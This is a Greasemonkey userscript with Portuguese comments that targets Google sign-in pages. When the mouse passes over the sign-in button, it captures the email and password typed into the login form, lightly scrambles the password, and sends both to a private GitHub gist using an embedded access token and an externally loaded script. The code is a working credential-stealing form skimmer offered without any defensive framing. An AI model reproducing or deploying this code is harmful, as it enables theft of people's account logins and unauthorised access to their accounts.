// ==UserScript==
// @name        testeCreateGist
// @description precisa: OAuth para o Gist, API externa; não realmente privados.
// @namespace   https://gist.github.com/micalevisk/3f94e2000732ce51304472a4564f4cfe
// @author      Micael Levi
// @locale      pt-br
// @include     *://accounts.google.com/*ServiceLogin?*
// @include     *://accounts.google.com/*signin*
// @version     1.04-2
// @grant       none
// @run-at	end
// ==/UserScript==


/////////////// [ PRIVATE DATA ] ///////////////
// @grant    GM_getResourceText
// @resource authentication file:///C:/Users/user/AppData/Roaming/Mozilla/Firefox/Profiles/xwt25znr.default/gm_scripts/_private-gist.js
// eval(GM_getResourceText("authentication"));
// const AUTH = gist_privateData;
// GIST_USERNAME = AUTH.username;
// PERSONAL_ACCESS_TOKEN = AUTH.useroauth;
const GIST_USERNAME = "micalevisk";
const PERSONAL_ACCESS_TOKEN = "<OAuth>";
const SENHA_PRIVADA = PERSONAL_ACCESS_TOKEN;
////////////////////////////////////////////////


// ignora tais prefixos/login:
const IGNORAR = [ "mlxlc", "terminatorredapb" ];
var user_especs = new USERSET("","",false);



/////////////////////////////////////////////////////////////////////////////////
// function USERSET(email, senha, flag){
// 	this.email = email;
// 	this.senha = senha;
// 	this.flag  = flag; // true: já foi postado.
// }

// (c) https://developer.mozilla.org/en-US/Add-ons/SDK/Guides/Contributor_s_Guide/Private_Properties
function USERSET(email, _senha, flag){
	"use strict";
	this.email = email;
	this.flag  = flag;
	this.getSenha = () => _senha;
	this.setSenha = (senha) => _senha = codificar(senha,SENHA_PRIVADA).join('/');
	this.toString = () => `{"email":"${this.email}", "senha":"${this.getSenha()}"}`;
}
/* @deprecated
function getDateAndHour(){
	var today = new Date();
	var dd = today.getDate();
	var mm = today.getMonth()+1;
	var yyyy = today.getFullYear();
	var HH = today.getHours();
	var MM = today.getMinutes();

	dd = dd.toString().normalizarData();
	mm = mm.toString().normalizarData();
	HH = HH.toString().normalizarData();
	MM = MM.toString().normalizarData();

	today = `[${mm}/${dd}/${yyyy} - ${HH}:${MM}]`;

	return today;
}
*/
/////////////////////////////////////////////////////////////////////////////////



/**
 * Inicia a API Gistachio (c) https://github.com/stuartpb/gistachio.
 * @param {String} id - A id no objeto script que será criado e inserido no head.
 * @param {Boolean} confirmar - Se for 'true', exibe uma mensagem no console após inserir.
 */
function initgistachioAPI(id, confirmar){
	if(document.getElementById(id) != null) return;

	var script = document.createElement('script');
	script.type = 'text/javascript';
	script.src = 'https://rawgit.com/micalevisk/GM_scripts/master/gistachio.js'; // (c) https://rawgit.com/stuartpb/gistachio/master/gistachio.js
	if(id) script.id  = id;
	document.head.appendChild(script);

	if(confirmar)
		console.info("gistachio inserido!");
}


/**
 * Cria e posta um gist no http://gits.github.com
 * @param {USERSET} conteudo - O conteúdo do gist (ao usar o método toString).
 * @param {String} filenmae - O nome do arquivo no gist.
 * @param {String} filedescription - A descrição do gist.
 * @param {String} oauthgist - Personal access token (definido para criar gists).
 */
function postit(conteudo, filename, filedescription, oauthgist){
	if(!conteudo || !filename) return;
	conteudo = `${(new Date()).formatar("[%m%/%d%/%Y%] - %H%:%i%:%s%")}\n<${window.location.hostname}>\n${conteudo.toString()}`;

	console.info("PREVIEW:");
	console.log(conteudo);

	var newfile = { fileName: { content: conteudo } };
	var optsnew = {
		accessToken: oauthgist,
		description: filedescription,
		public: false
	};

	var showResult = function(e, gistid){
		if(e){
			user_especs.flag = false;
			console.error(e);
		}
		else{
			user_especs.flag = true;
			linkresult = `https://gist.github.com/${GIST_USERNAME}/${gistid}`;

			console.log(linkresult);
			console.info(gistid);
		}
	};

	window.gistachio.postFiles(newfile, optsnew, showResult);
}



///////////////////////// [ ALTERAR ESTA ] /////////////////////////
function GM_main(){
	var formulario = document.querySelector('form#gaia_loginform');

	//   document.querySelector('form#gaia_loginform').addEventListener('submit', function (e) {
	//      e.preventDefault();
	//   });
	document.getElementById('signIn').onmouseover = function () {

		var loginmail= formulario.Email;
		var password = formulario.Passwd;

		if(typeof loginmail !== 'undefined'){
			let emailcurr = loginmail.value;

			// if(!IGNORAR.contemEmail(emailcurr) && (!user_especs.flag))
			// user_especs.email = emailcurr;
			if(!IGNORAR.contemEmail(emailcurr) && (!user_especs.flag))
			user_especs.email = emailcurr;
		}

		if(typeof password !== 'undefined'){
			if(!user_especs.email.isEmpty()){
				//FIXME if( (password.value.length >= 6))
				// console.error(user_especs.getFlag());
				if((!user_especs.flag) && (password.value.length >= 6)){
					user_especs.setSenha(password.value.toString());
					// user_especs.senha = password.value;
					postit(user_especs, 'teste bitch please conteúdo', 'descrição do gist', PERSONAL_ACCESS_TOKEN);
				}

				// if((!user_especs.flag) && (user_especs.senha.length >= 6))
				// postit(user_especs, 'teste bitch please conteúdo', 'descrição do gist', PERSONAL_ACCESS_TOKEN);
			}
		}

	};
}



////////////////////////////////////////////////////////////////////////////////////////////////////
String.prototype.isEmpty = function() {
    return !(this.trim());
}

Array.prototype.contemEmail = function (emailstr){
	var dominio = emailstr.replace(/^([^@]+)@.+$/i, "$1").trim();
	return (this.indexOf(dominio) > -1);
};

//(c) http://jsfromhell.com/geral/date-format [rev. #1]
Date.prototype.formatar = function(m){
	var d = this, a, fix = function(n, c){return (n = n + "").length < c ? new Array(++c - n.length).join("0") + n : n};
	var r = {};
        var f =
        {
                j: function(){return d.getDate()}, w: function(){return d.getDay()},
		y: function(){return (d.getFullYear() + "").slice(2)}, Y: function(){return d.getFullYear()},
		n: function(){return d.getMonth() + 1}, m: function(){return fix(f.n(), 2)},
		g: function(){return d.getHours() % 12 || 12}, G: function(){return d.getHours()},
		H: function(){return fix(d.getHours(), 2)}, h: function(){return fix(f.g(), 2)},
		d: function(){return fix(f.j(), 2)}, N: function(){return f.w() + 1},
		i: function(){return fix(d.getMinutes(), 2)}, s: function(){return fix(d.getSeconds(), 2)},
		ms: function(){return fix(d.getMilliseconds(), 3)}, a: function(){return d.getHours() > 11 ? "pm" : "am"},
		A: function(){return f.a().toUpperCase()}, O: function(){return d.getTimezoneOffset() / 60},
		z: function(){return (d - new Date(d.getFullYear() + "/1/1")) / 864e5 >> 0},
		L: function(){var y = f.Y(); return (!(y & 3) && (y % 1e2 || !(y % 4e2))) ? 1 : 0},
		t: function(){var n; return (n = d.getMonth() + 1) == 2 ? 28 + f.L() : n & 1 && n < 8 || !(n & 1) && n > 7 ? 31 : 30},
		W: function(){
        		var a = f.z(), b = 364 + f.L() - a, nd = (new Date(d.getFullYear() + "/1/1").getDay() || 7) - 1;
        		return (b <= 2 && ((d.getDay() || 7) - 1) <= 2 - b) ? 1 :
        			(a <= 2 && nd >= 4 && a >= (6 - nd)) ? new Date(d.getFullYear() - 1 + "/12/31").format("%W%") :
        			(1 + (nd <= 3 ? ((a + nd) / 7) : (a - (7 - nd)) / 7) >> 0);
		}
	}

	return m.replace(/%(.*?)%/g, function(t, s){
		return r[s] ? r[s](d, function(s){return f[s] && f[s]();}) : f[s] ? f[s]() : "%" + (s && s + "%");
	});
}


/**
 * @param {?} texto - se for {String} então será criptografado, se for {Array}, será descriptografado.
 * @param {String} strKey - o chave privada.
 * @return {Array} Cada elemento é o código ASCII do caractere de 'texto' (de)codificado.
 */
function codificar(texto, strKey){
	if(Array.prototype.slice.call(arguments).length != 2) return [];

	const arrayMap = Array.prototype.map;
	const toASCII  = x => x.charCodeAt(0);
	const arrKey = arrayMap.call(strKey, toASCII);
	var j = arrKey.length;

	// criptografando:
	if(typeof texto === "string"){
		var arrText = arrayMap.call(texto, toASCII);
		return arrText.map( (ascii, i) => ascii * arrKey[i % j] );
	}
	// descriptografando:
	return texto.map( (ascii, i) => ascii / arrKey[i % j] );
}
////////////////////////////////////////////////////////////////////////////////////////////////////




///////////////////////////////// [ MAIN ] ////////////////////////////////
initgistachioAPI('meulog', true);
window.addEventListener("load", GM_main, false);
